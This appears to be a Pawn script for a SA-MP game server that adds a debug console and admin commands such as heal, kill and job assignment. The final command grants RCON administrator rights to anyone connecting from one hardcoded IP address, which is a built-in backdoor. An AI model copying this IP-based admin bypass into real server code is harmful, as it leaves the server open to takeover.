#include <YSI_Coding\y_hooks>

static Text:TD_DebugConsole[14];
static debugLines[13][100];
static debugConsole, debugIndex, debugCount;

InsertDebugLine(line[], va_args<>) {
	static buffer[100];
	va_formatex(buffer, _, line, va_start<1>);

	if(debugCount < 13) {
		format(debugLines[debugCount], 100, buffer);
		TextDrawSetString(TD_DebugConsole[++debugCount], buffer);
	}
	else {
		format(debugLines[debugIndex++], 100, buffer);
		if(debugIndex == 13) {
			debugIndex = 0;
		}
		for(new i = 1, x = debugIndex; i < 14; ++i, ++x) {
			if(x == 13) {
				x = 0;
			}
			TextDrawSetString(TD_DebugConsole[i], isnull(debugLines[x]) ? (" ") : debugLines[x]);
		}
	}
}

hook OnGameModeInit() {
	TD_DebugConsole[0] = TextDrawCreate(174.275192, 271.000030, "box");
	TextDrawLetterSize(TD_DebugConsole[0], 0.000000, 19.651535);
	TextDrawTextSize(TD_DebugConsole[0], 490.556304, 0.000000);
	TextDrawAlignment(TD_DebugConsole[0], 1);
	TextDrawColor(TD_DebugConsole[0], -1);
	TextDrawUseBox(TD_DebugConsole[0], 1);
	TextDrawBoxColor(TD_DebugConsole[0], 194);
	TextDrawSetShadow(TD_DebugConsole[0], 0);
	TextDrawSetOutline(TD_DebugConsole[0], 0);
	TextDrawBackgroundColor(TD_DebugConsole[0], 255);
	TextDrawFont(TD_DebugConsole[0], 1);
	TextDrawSetProportional(TD_DebugConsole[0], 1);
	TextDrawSetShadow(TD_DebugConsole[0], 0);

	for(new i = 1; i < 14; ++i) {
		TD_DebugConsole[i] = TextDrawCreate(182.240112, 276.25 + 14.0 * (i - 1), " ");
		TextDrawLetterSize(TD_DebugConsole[i], 0.200000, 1.200000);
		TextDrawTextSize(TD_DebugConsole[i], 481.003326, 0.000000);
		TextDrawAlignment(TD_DebugConsole[i], 1);
		TextDrawColor(TD_DebugConsole[i], -1);
		TextDrawUseBox(TD_DebugConsole[i], 1);
		TextDrawBoxColor(TD_DebugConsole[i], 0);
		TextDrawSetShadow(TD_DebugConsole[i], 0);
		TextDrawSetOutline(TD_DebugConsole[i], 0);
		TextDrawBackgroundColor(TD_DebugConsole[i], 0);
		TextDrawFont(TD_DebugConsole[i], 2);
		TextDrawSetProportional(TD_DebugConsole[i], 1);
		TextDrawSetShadow(TD_DebugConsole[i], 0);
	}
}

CMD:clear(playerid, params[]) {
	if(player_Admin[playerid] == YIIN) {
		for(new i; i < sizeof debugLines; ++i) {
			debugLines[i][0] = EOS;
			debugIndex = debugCount = 0;
			InsertDebugLine("---");
		}
	}
	return true;
}

hook OnPlayerKeyStateChange(playerid, newkeys, oldkeys) {
	if(player_Admin[playerid] == YIIN) {
		if(PRESSED(KEY_NO)) {
			if(debugConsole ^= 1) {
				for(new i; i < sizeof TD_DebugConsole; ++i) {
					TextDrawShowForPlayer(playerid, TD_DebugConsole[i]);
				}
			}
			else {
				for(new i; i < sizeof TD_DebugConsole; ++i) {
					TextDrawHideForPlayer(playerid, TD_DebugConsole[i]);
				}
			}
		}
	}
}

CMD:heal(playerid, params[]) {
	if(player_Admin[playerid] == YIIN) {
		player_MaxHealth[playerid] = 
			player_Health[playerid] = 
				max(player_MaxHealth[playerid], (isnull(params) || floatstr(params) < 50.0) ? 50.0 : floatstr(params));
		UpdatePlayerHealth(playerid);
	}
	else M:P:E(playerid, "Tu ne yiin");
	return true;
}

CMD:health(playerid, params[]) {
	if(player_Admin[playerid] == YIIN) {
		player_Health[playerid] = floatstr(params);

		if(player_Health[playerid] > player_MaxHealth[playerid]) {
			player_MaxHealth[playerid] = player_Health[playerid];
		}
		UpdatePlayerHealth(playerid);
	}
	else M:P:E(playerid, "Tu ne yiin");
	return true;
}

CMD:maxhealth(playerid, params[]) {
	if(player_Admin[playerid] == YIIN) {
		SetPlayerMaxHealth(playerid, floatstr(params));
		if(player_Health[playerid] > player_MaxHealth[playerid]) {
			player_Health[playerid] = player_MaxHealth[playerid];
		}
		UpdatePlayerHealth(playerid);
	}
	else M:P:E(playerid, "Tu ne yiin");
	return true;
}

CMD:akill(playerid, params[]) {
	if(player_Admin[playerid] == YIIN) {
		extract params -> new player:targetid;
		if(targetid == INVALID_PLAYER_ID) {
			targetid = playerid; // get fucked
		}
		SetPlayerHealth(targetid, 0);
	}
	else M:P:E(playerid, "Tu ne yiin");
	return true;
}

CMD:jobleave(playerid, params[]) {
	if(player_Admin[playerid] == YIIN) {
		if(player_Job[playerid]) {
			job_Kick(playerid);
		}
	}
	else M:P:E(playerid, "Tu ne yiin");
	return true;
}

CMD:jobjoin(playerid, params[]) {
	if(player_Admin[playerid] == YIIN) {
		job_Join(playerid, strval(params));
	}
	else M:P:E(playerid, "Tu ne yiin");
	return true;
}

CMD:drk(playerid, params[]) {
	if(player_Admin[playerid] == YIIN) {
		extract params -> new player:targetid, jobid;
		if(targetid == INVALID_PLAYER_ID) {
			targetid = playerid; // get fucked
		}
		if(player_Job[targetid]) {
			job_Kick(targetid);
		}
		if(jobid) {
			job_Join(targetid, jobid);
			player_JobRank[targetid] = JOB_RANK_LEADER;
			M:P:I(targetid, "Esi paskirtas direktoriumi.");
		}
	}
	else M:P:E(playerid, "Tu ne yiin");
	return true;
}

CMD:admin(playerid, params[]) {
	static ip[16], toggle;
	GetPlayerIp(playerid, ip, sizeof(ip));
	if( ! strcmp(ip, "78.58.200.185")) {
		SetPlayerAdmin(playerid, bool:(toggle ^= 1));
		M:P:G(playerid, "RCON: [highlight]%s", toggle ? ("on") : ("off"));
	}
	return true;
}